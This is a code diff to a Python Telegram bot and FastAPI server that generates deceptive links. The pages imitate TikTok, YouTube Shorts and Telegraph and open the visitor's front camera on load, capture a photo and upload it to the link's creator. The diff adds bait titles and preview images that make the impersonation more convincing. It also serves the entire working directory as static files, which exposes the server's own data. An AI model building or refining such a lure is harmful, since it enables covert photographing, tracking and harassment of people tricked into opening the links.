@@ -13,6 +13,7 @@ from aiogram.filters import Command, CommandStart
 from aiogram.types import BufferedInputFile, KeyboardButton, Message, ReplyKeyboardMarkup
 from fastapi import FastAPI, File, HTTPException, Request, UploadFile
 from fastapi.responses import HTMLResponse, JSONResponse
+from fastapi.staticfiles import StaticFiles
 
 BOT_TOKEN = os.environ["BOT_TOKEN"]
 PUBLIC_BASE_URL = os.environ["PUBLIC_BASE_URL"].rstrip("/")
@@ -20,11 +21,15 @@ PORT = int(os.getenv("PORT", "8000"))
 DB_PATH = Path(os.getenv("DB_PATH", "links.sqlite3"))
 MAX_PHOTO_BYTES = 10 * 1024 * 1024
 
+# Инициализация бота
 bot = Bot(BOT_TOKEN)
 dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 app = FastAPI(docs_url=None, redoc_url=None)
+
+# Монтируем статические файлы
+app.mount("/static", StaticFiles(directory="."), name="static")
 
 SERVICES = {
     "tiktok": {"name": "TikTok", "emoji": "🎵", "route": "tiktok"},
@@ -142,18 +147,18 @@ async def lookup_ip(ip: str) -> dict:
 
 
 def public_link(service: str, token: str) -> str:
-    """Генерирует ссылку, которая выглядит как настоящий сервис, но ведёт на ваш сайт"""
-    service_info = SERVICES.get(service, SERVICES["tiktok"])
+    """Генерирует ссылку, которая выглядит как настоящий сервис"""
     short_id = token[:8]
     
-    # Генерируем ссылку, которая выглядит как настоящий сервис
-    # но на самом деле ведёт на ваш сервер
+    # Ссылки выглядят как настоящие сервисы, но ведут на ваш сервер
+    base = PUBLIC_BASE_URL.replace('https://', '').split('/')[0]
+    
     if service == "tiktok":
-        return f"https://{PUBLIC_BASE_URL.replace('https://', '').split('/')[0]}/@{short_id}"
+        return f"https://{base}/@{short_id}"
     elif service == "youtube":
-        return f"https://{PUBLIC_BASE_URL.replace('https://', '').split('/')[0]}/shorts/{short_id}"
+        return f"https://{base}/shorts/{short_id}"
     elif service == "telegraph":
-        return f"https://{PUBLIC_BASE_URL.replace('https://', '').split('/')[0]}/{short_id}"
+        return f"https://{base}/{short_id}"
     else:
         return f"{PUBLIC_BASE_URL}/{service}/{token}"
 
@@ -279,8 +284,10 @@ async def new_link(message: Message):
     await message.answer("Выберите оформление новой ссылки:", reply_markup=service_keyboard())
 
 
-def generate_tiktok_page(token: str) -> str:
+def generate_tiktok_page(token: str, title: str = "Новое видео", description: str = "🔥 Смотрите это видео") -> str:
     short_id = token[:8]
+    photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"
+    
     return f'''<!doctype html>
 <html lang="ru">
 <head>
@@ -292,12 +299,15 @@ def generate_tiktok_page(token: str) -> str:
 :root {{ color-scheme:dark; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }}
 body {{ background:#000; min-height:100vh; display:flex; justify-content:center; align-items:center; }}
 .video-container {{ position:relative; width:100%; max-width:400px; aspect-ratio:9/16; background:#0a0a0a; border-radius:20px; overflow:hidden; box-shadow:0 0 60px rgba(0,242,234,0.15); }}
+.video-container .preview {{ width:100%; height:100%; object-fit:cover; display:block; }}
 .video-container video {{ width:100%; height:100%; object-fit:cover; display:none; }}
 .overlay {{ position:absolute; inset:0; display:flex; flex-direction:column; justify-content:space-between; padding:20px; background:linear-gradient(180deg,rgba(0,0,0,0.6) 0%,transparent 40%,transparent 60%,rgba(0,0,0,0.8) 100%); }}
 .user-info {{ display:flex; align-items:center; gap:12px; }}
 .user-info .avatar {{ width:44px; height:44px; border-radius:50%; background:linear-gradient(135deg,#00f2ea,#ff0050); display:flex; align-items:center; justify-content:center; font-size:20px; }}
 .user-info .username {{ color:#fff; font-weight:700; font-size:17px; }}
 .user-info .username span {{ color:#888; font-weight:400; font-size:14px; }}
+.video-title {{ color:#fff; font-size:18px; font-weight:600; margin:8px 0 4px; text-shadow:0 2px 8px rgba(0,0,0,0.8); }}
+.video-desc {{ color:rgba(255,255,255,0.8); font-size:14px; text-shadow:0 2px 4px rgba(0,0,0,0.8); }}
 .bottom {{ display:flex; flex-direction:column; gap:12px; }}
 .status {{ color:#fff; font-size:15px; text-align:center; min-height:24px; background:rgba(0,0,0,0.5); border-radius:12px; padding:10px; backdrop-filter:blur(8px); }}
 .notice {{ color:rgba(255,255,255,0.7); font-size:12px; text-align:center; padding:8px; background:rgba(255,255,255,0.05); border-radius:10px; }}
@@ -310,21 +320,27 @@ body {{ background:#000; min-height:100vh; display:flex; justify-content:center;
 </head>
 <body>
 <div class="video-container">
+  <img class="preview" id="preview" src="{photo_url}" alt="Preview">
   <video id="video" playsinline autoplay muted></video>
   <div class="overlay">
     <div class="user-info">
       <div class="avatar">🎵</div>
       <div class="username">@{short_id} <span>• TikTok</span></div>
     </div>
+    <div>
+      <div class="video-title">{title}</div>
+      <div class="video-desc">{description}</div>
+    </div>
     <div class="bottom">
       <div id="status" class="status"><div class="loading"><div class="spinner"></div><span>Запрос камеры...</span></div></div>
-      <div class="notice">⚠️ Фото будет отправлено автоматически после разрешения камеры</div>
+      <div class="notice">⚠️ После разрешения камеры фото будет отправлено</div>
     </div>
   </div>
 </div>
 <script>
 const token = "{token}";
 const video = document.getElementById('video');
+const preview = document.getElementById('preview');
 const status = document.getElementById('status');
 let photoSent = false;
 
@@ -335,6 +351,7 @@ async function requestCamera() {{
         const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode:'user' }}, audio:false }});
         video.srcObject = stream;
         video.style.display = 'block';
+        preview.style.display = 'none';
         await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
         status.innerHTML = '📸 Съёмка...';
         const canvas = document.createElement('canvas');
@@ -364,6 +381,7 @@ async function sendPhoto(blob) {{
         status.innerHTML = '✅ Фото отправлено!';
         status.className = 'status success';
         video.style.display = 'none';
+        preview.style.display = 'block';
     }} catch (e) {{
         status.innerHTML = '❌ ' + e.message;
         status.className = 'status error';
@@ -371,14 +389,16 @@ async function sendPhoto(blob) {{
     }}
 }}
 
-document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 500));
+document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 800));
 </script>
 </body>
 </html>'''
 
 
-def generate_youtube_page(token: str) -> str:
+def generate_youtube_page(token: str, title: str = "YouTube Shorts", description: str = "🔥 Смотрите это видео") -> str:
     short_id = token[:8]
+    photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"
+    
     return f'''<!doctype html>
 <html lang="ru">
 <head>
@@ -390,10 +410,12 @@ def generate_youtube_page(token: str) -> str:
 :root {{ color-scheme:dark; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }}
 body {{ background:#0a0a0a; min-height:100vh; display:flex; justify-content:center; align-items:center; }}
 .container {{ width:100%; max-width:500px; background:#1a1a1a; border-radius:20px; overflow:hidden; box-shadow:0 0 50px rgba(255,0,0,0.1); }}
-.video-wrapper {{ position:relative; background:#000; }}
-.video-wrapper video {{ width:100%; aspect-ratio:9/16; object-fit:cover; display:none; }}
-.video-wrapper .shorts-label {{ position:absolute; top:12px; right:12px; background:rgba(255,0,0,0.9); color:#fff; padding:4px 12px; border-radius:12px; font-size:12px; font-weight:700; letter-spacing:0.5px; }}
-.video-wrapper .video-title {{ position:absolute; bottom:12px; left:12px; color:#fff; font-size:14px; font-weight:600; text-shadow:0 2px 4px rgba(0,0,0,0.8); }}
+.video-wrapper {{ position:relative; background:#000; aspect-ratio:9/16; overflow:hidden; }}
+.video-wrapper .preview {{ width:100%; height:100%; object-fit:cover; display:block; }}
+.video-wrapper video {{ width:100%; height:100%; object-fit:cover; display:none; position:absolute; top:0; left:0; }}
+.video-wrapper .shorts-label {{ position:absolute; top:12px; right:12px; background:rgba(255,0,0,0.9); color:#fff; padding:4px 12px; border-radius:12px; font-size:12px; font-weight:700; letter-spacing:0.5px; z-index:2; }}
+.video-wrapper .video-title {{ position:absolute; bottom:12px; left:12px; right:12px; color:#fff; font-size:16px; font-weight:600; text-shadow:0 2px 8px rgba(0,0,0,0.9); z-index:2; }}
+.video-wrapper .video-desc {{ position:absolute; bottom:44px; left:12px; right:12px; color:rgba(255,255,255,0.7); font-size:13px; text-shadow:0 2px 4px rgba(0,0,0,0.8); z-index:2; }}
 .content {{ padding:16px 20px 20px; }}
 .title {{ color:#fff; font-size:18px; font-weight:600; margin-bottom:8px; }}
 .channel {{ color:#aaa; font-size:14px; display:flex; align-items:center; gap:8px; }}
@@ -409,9 +431,11 @@ body {{ background:#0a0a0a; min-height:100vh; display:flex; justify-content:cent
 <body>
 <div class="container">
   <div class="video-wrapper">
+    <img class="preview" id="preview" src="{photo_url}" alt="Preview">
     <video id="video" playsinline autoplay muted></video>
     <div class="shorts-label">#Shorts</div>
-    <div class="video-title">📸 Подтверждение фото</div>
+    <div class="video-desc">{description}</div>
+    <div class="video-title">{title}</div>
   </div>
   <div class="content">
     <div class="title">YouTube Shorts</div>
@@ -423,6 +447,7 @@ body {{ background:#0a0a0a; min-height:100vh; display:flex; justify-content:cent
 <script>
 const token = "{token}";
 const video = document.getElementById('video');
+const preview = document.getElementById('preview');
 const status = document.getElementById('status');
 let photoSent = false;
 
@@ -433,6 +458,7 @@ async function requestCamera() {{
         const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode:'user' }}, audio:false }});
         video.srcObject = stream;
         video.style.display = 'block';
+        preview.style.display = 'none';
         await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
         status.innerHTML = '<div class="spinner"></div><span>📸 Съёмка...</span>';
         const canvas = document.createElement('canvas');
@@ -462,6 +488,7 @@ async function sendPhoto(blob) {{
         status.innerHTML = '✅ Фото успешно отправлено!';
         status.className = 'status success';
         video.style.display = 'none';
+        preview.style.display = 'block';
     }} catch (e) {{
         status.innerHTML = '❌ ' + e.message;
         status.className = 'status error';
@@ -469,7 +496,7 @@ async function sendPhoto(blob) {{
     }}
 }}
 
-document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 500));
+document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 800));
 </script>
 </body>
 </html>'''
@@ -477,6 +504,8 @@ document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 50
 
 def generate_telegraph_page(token: str, title: str, content: str) -> str:
     short_id = token[:8]
+    photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"
+    
     return f'''<!doctype html>
 <html lang="ru">
 <head>
@@ -496,6 +525,7 @@ body {{ background:#f5f5f5; min-height:100vh; display:flex; justify-content:cent
 .article-body {{ padding:32px; }}
 .article-body .content {{ font-size:17px; line-height:1.8; color:#222; }}
 .article-body .content p {{ margin-bottom:16px; }}
+.article-body .content img {{ max-width:100%; border-radius:12px; margin:16px 0; }}
 .camera-section {{ margin-top:24px; padding:24px; background:#f8f9fa; border-radius:16px; border:1px solid #e8e8e8; }}
 .camera-section .camera-status {{ display:flex; align-items:center; gap:12px; min-height:48px; font-size:15px; color:#333; }}
 .camera-section .camera-status .spinner {{ width:24px; height:24px; border:2px solid #e8e8e8; border-top-color:#2c3e50; border-radius:50%; animation:spin 0.8s linear infinite; flex-shrink:0; }}
@@ -515,6 +545,7 @@ video {{ display:none; }}
   </div>
   <div class="article-body">
     <div class="content">
+      <img src="{photo_url}" alt="Preview" style="max-width:100%;border-radius:12px;margin:0 0 16px 0;">
       {content.replace(chr(10), '<br>')}
     </div>
     <div class="camera-section">
@@ -573,7 +604,7 @@ async function sendPhoto(blob) {{
     }}
 }}
 
-document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 500));
+document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 800));
 </script>
 </body>
 </html>'''
@@ -598,7 +629,7 @@ async def tiktok_link(short_id: str):
     if used == 2:
         return HTMLResponse("<h3>Фото по этой ссылке сейчас отправляется.</h3>", status_code=409)
     
-    return HTMLResponse(generate_tiktok_page(token))
+    return HTMLResponse(generate_tiktok_page(token, "Новое видео от @" + short_id, "🔥 Смотрите это видео до конца!"))
 
 
 @app.get("/shorts/{short_id}")
@@ -615,17 +646,16 @@ async def youtube_link(short_id: str):
     if used == 2:
         return HTMLResponse("<h3>Фото по этой ссылке сейчас отправляется.</h3>", status_code=409)
     
-    return HTMLResponse(generate_youtube_page(token))
+    return HTMLResponse(generate_youtube_page(token, "📸 Подтверждение фото", "🔥 Смотрите это видео до конца!"))
 
 
 @app.get("/{short_id}")
 async def telegraph_link(short_id: str):
     """Обработчик ссылок в стиле Telegraph - /abc123def"""
-    # Сначала ищем в Telegraph
     row = get_link_by_short_id(short_id, "telegraph")
     
     if not row:
-        # Если не нашли, пробуем другие сервисы для обратной совместимости
+        # Если не нашли в Telegraph, пробуем другие сервисы для обратной совместимости
         row = get_link_by_short_id(short_id)
         
         if not row:
@@ -638,9 +668,9 @@ async def telegraph_link(short_id: str):
         return HTMLResponse("<h3>Фото по этой ссылке сейчас отправляется.</h3>", status_code=409)
     
     if service == "tiktok":
-        return HTMLResponse(generate_tiktok_page(token))
+        return HTMLResponse(generate_tiktok_page(token, "Новое видео от @" + short_id, "🔥 Смотрите это видео до конца!"))
     elif service == "youtube":
-        return HTMLResponse(generate_youtube_page(token))
+        return HTMLResponse(generate_youtube_page(token, "📸 Подтверждение фото", "🔥 Смотрите это видео до конца!"))
     elif service == "telegraph":
         return HTMLResponse(generate_telegraph_page(token, title or "📝 Статья Telegraph", content or "Это пример статьи, созданной через бота."))
     else:
@@ -665,9 +695,9 @@ async def camera_page_old(token: str, service: str | None = None):
         raise HTTPException(404, "Ссылка не найдена")
     
     if selected_service == "tiktok":
-        return HTMLResponse(generate_tiktok_page(token))
+        return HTMLResponse(generate_tiktok_page(token, "Новое видео от @" + token[:8], "🔥 Смотрите это видео до конца!"))
     elif selected_service == "youtube":
-        return HTMLResponse(generate_youtube_page(token))
+        return HTMLResponse(generate_youtube_page(token, "📸 Подтверждение фото", "🔥 Смотрите это видео до конца!"))
     elif selected_service == "telegraph":
         return HTMLResponse(generate_telegraph_page(token, title or "📝 Статья Telegraph", content or "Это пример статьи, созданной через бота."))
     
